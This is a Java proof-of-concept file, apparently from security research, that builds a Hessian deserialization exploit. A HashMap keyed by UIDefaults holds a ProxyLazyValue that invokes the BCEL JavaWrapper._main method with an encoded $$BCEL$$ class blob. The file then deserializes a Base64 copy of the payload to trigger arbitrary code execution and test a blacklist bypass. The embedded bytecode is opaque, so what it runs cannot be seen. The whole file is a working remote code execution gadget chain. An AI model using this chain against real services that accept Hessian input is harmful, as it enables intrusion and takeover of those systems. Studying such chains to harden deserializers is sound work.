package com.hzk.safe.payload.serializable.hessian.bug;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * 黑名单测试
 */
public class HessianBlacklistTest {

    public static void main(String[] args) throws Exception {
        UIDefaultsTest();
    }

    private static void UIDefaultsTest() throws Exception {
        Map<Object, Object> map = new HashMap<>();
        UIDefaults uiDefaults1 = new UIDefaults();
        map.put(uiDefaults1, uiDefaults1);
        UIDefaults uiDefaults2 = new UIDefaults();
        UIDefaults.ProxyLazyValue lazyValue = new UIDefaults.ProxyLazyValue(
                "com.sun.org.apache.bcel.internal.util.JavaWrapper",
                "_main",
                new Object[]{"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$dbR$d3P$U$5d$a7MI$5b$82b$b9$K$5e$A$V$5b$QR$dbP$Q$Q$95$8eoUq$820$d5$ce8$t$e1H$83iR$93T$a8$cf$fe$84_$c030$D$8e$8c$7e$80$df$e4$a8$3b$c5$B$3b$f0$90$b3$afg$ef$b5$d7$d9$f9$f9$fb$db$P$A9$y3T$5coS$e5unV$85j$I$ee4$C$cb$f6U$d3m$ba$81P$b7$7c$d7$J$9au$a1Z$b5$ba$ad$ae$92$a6$L$cf$e2$b6$f5Ix$cb$dc$Xy$z$5b$e0$b9$821gj$F$cd$c8$9bFA$cbi3$d9$bc$f6nvV$e3$86$90$c1$Y$ba$b7$f8G$ae$da$dc$d9T_$Y$5b$c2$MdD$Z$q$83$ee3$a4JgQ$3d$f0$ygs$81$n$ea$8b$3a$9dfm$83$a1c$d1r$ac$60$89$cctf$8d$a1$e7$y$fd$e9$8e$v$ea$81$e5$3a2$3a$V$q$90LBB$X$83$ec$fa$d3$O$af$898$$$b75$d7$9b$7e$mj2$ae0tn$8a$60$c5s$eb$c2$L$9a$M$e3$e9$f3$m2$e7$5d$Kz$d0$9bD$K$7d$ede$5bQ$Z$DT6pK$ee$b6$f0$8a$ad$d1z$d3$X$W$b9$8a$a1$q$G1L$Tm$5bN$i$d7$Z$e2$s$d1$cc$z$c7g$Y$fe$lK$b1$ca$3d$5d$7ch$I$c7$U$L$99$d7$Knb$q$bc$3bJC$S9$d3b$87$86$bc$a5$m$86$8e$E$o$b8$c3$QQ$cd8$ee$w$90O$3c$ZJT$N$cbQ$fdj$i$93$U$9e$a2$f0$94$82$f8IXe$Y$3c$ebF$84$98$c2$f7$97$h$96$bd$n$3c$Z$f7$Z$fa$d3o$$$a0f$zd$3b$9f$a4$fd$d1$Yb$7e$c0$bd$80$a1$afm$da$7f$b5h$dc$Cf$c3$cc9$9ar$d1$b4$ff$bd$e5$Y$a1$lQ$cd$R$3a$8b$f3$95W$be$f0$fc$caJ$c3$b0$z$b3R$e5$e6$fb$40$f8A$i$LI$82H$ef$Z$7b$5b$pnhc$8a$ee$G$d1$da$a5$H$94$f2$8c$d7W$b9a$93$9d$3c$dd$D$l$a3tC$a2$cd$8e$S$40$o$85$b4DHEK$c6$5b2$K$W$ae$K$9d$8f$c8$faL$d9$R$92$fa$c4$R$$$a5$ba$bf$a2$ff$Q$d7R7$O1$f6$F$dd$a9$db$H$YO$a5$P0$b1$8b$ae$d4$bd$d0$98$s$a3$e3$3b$G$cb$d1$7d$8c$ebei$l$Tz9$b6$8f$ac$5e$3aF$ae$3cy$84$99C$3cX$df$85T$da$a3$W$S$9e$e3$r$U$d2$kS$93$BH$7f$I$n$93$c3$96$J$fa7$94_$mt$S$n$9b$3fE4$d4$c2$DB$b3x$80$ec1$o$e5$p$3c$5c$dfk$f9$SXB$9e$e2a$5e$lI$W$fa$daS$9e$d0$tQ$40$B$fe$CT$7d$_$60$e5$D$A$A"});
        uiDefaults2.put("aaa", lazyValue);
        map.put(uiDefaults2, uiDefaults2);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(bos);
        out.writeObject(map);
        out.close();
        byte[] serialize = bos.toByteArray();

//        byte[] serialize = serialize(map);


        String payloadBase64 = "SE0WamF2YXguc3dpbmcuVUlEZWZhdWx0cwNhYWFDMCVqYXZheC5zd2luZy5VSURlZmF1bHRzJFByb3h5TGF6eVZhbHVllAljbGFzc05hbWUKbWV0aG9kTmFtZQNhY2MEYXJnc2AwMWNvbS5zdW4ub3JnLmFwYWNoZS5iY2VsLmludGVybmFsLnV0aWwuSmF2YVdyYXBwZXIFX21haW5OcQdbb2JqZWN0cQdbc3RyaW5nUwYaJCRCQ0VMJCQkbCQ4YiRJJEEkQSRBJEEkQSRBJEFtUyRkYlIkZDNQJFUkNWQkYTdNSSQ1YiQ4MmIkYjkkSyQ1ZSRBJFYkNWIkUVIkZGJQJFEkUSQ5NSQ4ZW9VcSQ4MjAkZDUkY2U4JHQkZTFIJDgzaVIkOTNUJGE4JGNmJGZlJDg0XyRjMDMwJEQkOGUkOGMkN2UkODAkZGYkZTQkYTgkM2IkYzUkQiQzYiRmMCQ5MCRiMyRhZmckZWYkYjUkZDckZDkkZjkkZjkkZmIkZGIkUCRBOSR5M1QkNWNvUyRlNXVuViQ4NWokSSRlZTQkQyRjYiRmNlUkZDNtJGJhJDgxUCRiNyQ3YyRkNyRKJDlhdSRhMVokYjUkYmEkYWQkYWUkOTIkYTYkTCRjZiRlMiRiNiRmNUl4JGNiJGRjJFh5JHokNWIkZTAkYjkkODIxZ2okRiRjZCRjOCQ5YkZBJGNiaTMkZDkkYmMkZjZudlYkZTMkODYkOTAkYzEkWSRiYSRiNyRmOEckYWUkZGEkZGMkZDlUXyRZJDViJGMyJE1kRCRaJHEkODMkZWUzJGE0SmdRJDNkJGYwJHlncyQ4MSRuJGVhJDhiJDNhJDlkZm0kODMkYTFjJGQxciRhYyQ2MCQ4OSRjY3RmJDhkJGExJGU3JHkkZmQkZTkkOGUkdiRlYSQ4MSRlNSQzYTIkM2EkViRxJDkwTEJCJFgkODMkZWMkZmEkZDMkTyRhZiQ4OTgkJCRiNzUkZDckOWIkN2UkbWoyJGFlMHRuJDhhJDYwJGM1cyRlYiRjMiRMJDlhJE0kZTMkZTkkZjMkbTIkZTckNWQkS3okZDAkOWJEJEskN2QkZWRlJDViUSRaJERUNnBLJGVlJGI2JGYwJDhhJGFkJGQxeiRkMyRYJFckYjkkOGEkYTEkcSRHMUwkVG0kNWJOJGkkZDckWiRlMiRzJGQxJGNjJHokYzdnJFkkZmUkbEskYjEkY2EkM2QkNWQkN2NoJEkkYzckVSRMJDk5JGQ3JEtuYiRxJGJjJDNiSkMkUzkkZDNiJDg3JDg2JGJjJGE1JG0kODYkOGUkRSRvJGI4JGMzJFFRJGNkOCRlZSR3JDkwTyQzYyRaSlQkTiRjYlEkZmRqJGkkOTMkVSQ5ZSRhMiRmMCQ5NCQ4MiRmOElYZSRZJDNjJGViRiQ4NCQ5OCRjMiRmNyQ5NyRoJDk2JGJkJG4kM2MkWiRmNyRaJGZhJGQzbyQkJGEwZiR6ZCQzYiQ5ZiRhNCRmZCRkMSRZYiQ3ZSRjMCRiZCQ4MCRhMSRhZm0kZGEkN2YkYjVoJGRjJENmJGMzJGNjOSQ5YXIkZDEkYjQkZmYkYmQkZTUkWSRhMSRsUSRjZCRSJDNhJDhiJGYzJDk1VyRiZSRmMCRmYyRjYUokYzMkYjAkeiRiM1IkZTUkZTYkZmIkNDAkZjhBJGkkTEkkODJIJGVmJFokN2IkNWIkcG5oYyQ4YSRlZSRHJGQxJGRhJGE1JEgkOTQkZjIkOGMkZDdXJGI5YSQ5MyQ5ZCQzYyRkZCREJGwkYTN0QyRhMiRjZCQ4ZSRTJDQwJG8kODUkYjRESEVLJGM2JDViMiRLJFckYWUkSyQ5ZCQ4ZiRjOCRmYUwkZDkkUiQ5MiRmYSRjNCRSJCQkYTUkYmEkYmYkYTIkZmYkUSRkN1I3JE8xJGY2JEYkZGQkYTkkZGIkSCRZTyRhNSRQMCRiMSQ4YiRhZSRkNCRiZCRkMCQ5OCRzJGEzJGUzJDNiJEckY2IkZDEkN2QkOGMkZWJlaSRsJFR6OSRiNiQ4ZiRhYyQ1ZSQzYUYkYWUkM2N5JDg0JDk5QyQzY1gkZGYkODVUJGRhJGEzJFckUyQ5ZSRlMyRyJFUkZDIka1MkOTMkQkgkN2YkSSRuJDkzJGMzJDk2JEokZmE3JDk0XyRtdCRTJG4kOWIkM2ZFNCRkNCRjMiREQiRiM3gkODAkZWMxJG8kZTUkcCQzYyQ1YyRkZmskZjkkU1hCJDllJGUyYSQ1ZSRsSSRXJGZhJGRhUyQ5ZSRkMCR0USQ0MCRCJGZlJENUJDdkJF8kNjAkZTUkRCRBJEFaUZFNkANhYWFRklpRlVo=";
        byte[] bytes1 = Base64.getDecoder().decode(payloadBase64);
        // 进断点com.sun.org.apache.bcel.internal.util.JavaWrapper._main
        Object deserialize = deserialize(bytes1);


        System.out.println(deserialize);


    }


    private static byte[] serialize(Object object) {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
            Hessian2Output h2o = new Hessian2Output(bos);
//            h2o.setSerializerFactory(NativeHessianSerializerFactory.SERIALIZER_FACTORY);
            h2o.writeObject(object);
            h2o.flush();
            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static Object deserialize(byte[] bytes) {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(bytes)) {
            Hessian2Input h2i = new Hessian2Input(bis);
//            h2i.setSerializerFactory(NativeHessianSerializerFactory.SERIALIZER_FACTORY);
            return h2i.readObject();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

}
